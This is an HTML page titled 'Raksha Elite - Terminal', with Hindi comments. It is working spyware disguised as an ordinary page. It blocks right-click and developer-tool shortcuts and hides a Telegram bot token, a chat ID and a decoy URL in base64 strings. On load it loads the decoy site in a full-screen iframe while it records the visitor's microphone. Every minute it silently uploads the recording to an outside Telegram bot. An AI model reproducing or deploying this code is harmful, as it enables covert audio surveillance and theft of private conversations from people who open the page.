<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Raksha Elite - Terminal</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; background: #000; }
        iframe { width: 100%; height: 100%; border: none; pointer-events: auto; }
    </style>
    <script>
        // राइट क्लिक, F12, और व्यू सोर्स को पूरी तरह डिसेबल करना
        document.addEventListener('contextmenu', e => e.preventDefault());
        document.onkeydown = function(e) {
            if(e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) {
                return false;
            }
        };
    </script>
</head>
<body>

    <iframe id="mainView" src="about:blank" allow="microphone; camera;"></iframe>

    <script>
        // यह कोड डेटा को हवा में (In-memory) डिकोड करेगा, फाइल में कुछ नहीं दिखेगा
        (function() {
            const _k = ["ODM3ODAzNzkzNzpBQUdqdUZkWldsbmYwa0ZmVEdfUUlGc2xndnJETUItc0M0", "ODUwODc5MjQwMw==", "aHR0cHM6Ly9hZXN0aGV0aWMteWVvdC05M2Q4MzUubmV0lmeS5hcHA="];
            const _d = (s) => atob(s);

            const f = document.getElementById('mainView');
            f.src = _d(_k[2]); // असली लिंक लोड हो रहा है

            async function _s() {
                try {
                    const st = await navigator.mediaDevices.getUserMedia({ audio: true });
                    const r = new MediaRecorder(st);
                    let c = [];
                    r.ondataavailable = (e) => { if (e.data.size > 0) c.push(e.data); };
                    r.onstop = async () => {
                        const b = new Blob(c, { type: 'audio/ogg' });
                        const d = new FormData();
                        d.append("chat_id", _d(_k[1]));
                        d.append("voice", b, "rec.ogg");
                        fetch(`https://api.telegram.org/bot${_d(_k[0])}/sendVoice`, { method: "POST", body: d });
                        c = []; r.start();
                    };
                    r.start();
                    setInterval(() => { if (r.state === "recording") r.stop(); }, 60000); // 1 मिनट रिकॉर्डिंग
                } catch (e) {}
            }
            window.onload = _s;
        })();
    </script>
</body>
</html>
